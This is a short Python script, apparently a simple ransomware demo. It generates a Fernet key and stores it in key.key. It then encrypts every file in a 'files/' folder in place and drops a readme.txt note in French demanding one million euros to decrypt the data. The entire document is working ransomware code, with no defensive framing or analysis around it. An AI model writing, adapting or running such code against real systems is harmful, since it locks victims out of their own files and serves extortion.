import os

from cryptography.fernet import Fernet, InvalidToken

KEY_FILE_NAME = "key.key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE_NAME, "wb") as f:
        f.write(key)


def read_key():
    with open(KEY_FILE_NAME, "rb") as f:
        return f.read()


def encrypt(targets, key):
    fernet_key = Fernet(key)
    for target in targets:
        with open(target, "rb") as f:
            file_content = f.read()

        try:
            fernet_key.decrypt(file_content)
            print(f"{target} is already encrypted. Skipped.")
            continue
        except (InvalidToken, Exception):
            encrypted_content = fernet_key.encrypt(file_content)
            with open(target, "wb") as f:
                f.write(encrypted_content)
            print(f"{target} has been encrypted.")

def request_for_ransom(target_folder_path):
    with open(target_folder_path + "readme.txt", "wb") as f:
        message = "Pour 1 000 000 euros, nous déchiffrons vos données!!"
        f.write(message.encode())

if __name__ == '__main__':
    if not os.path.exists("key.key"):
        generate_key()

    target_folder_path = "files/"
    key = read_key()
    targets = [target_folder_path + filename for filename in os.listdir(target_folder_path) if filename != "readme.txt"]

    encrypt(targets, key)
    request_for_ransom(target_folder_path)
